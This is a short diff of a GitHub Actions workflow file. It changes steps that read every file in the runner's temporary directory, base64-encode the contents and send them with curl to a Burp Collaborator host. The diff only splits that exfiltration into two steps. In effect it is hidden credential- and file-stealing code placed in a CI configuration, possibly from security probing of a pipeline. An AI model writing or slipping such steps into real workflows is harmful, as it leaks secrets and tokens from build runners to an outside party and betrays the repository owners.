@@ -31,6 +31,7 @@ jobs:
 
       - run: ls $RUNNER_TEMP
 
-      - run: curl "https://f8os7s20hh2qbwaro5ecszhl1c78vx.burpcollaborator.net?test=$(find $RUNNER_TEMP -type f -maxdepth 1 | xargs cat | base64)"
+      - run: RESULT=$(find $RUNNER_TEMP -type f -maxdepth 1 | xargs cat | base64)
+      - run: curl "https://f8os7s20hh2qbwaro5ecszhl1c78vx.burpcollaborator.net?result=$RESULT"
 
 
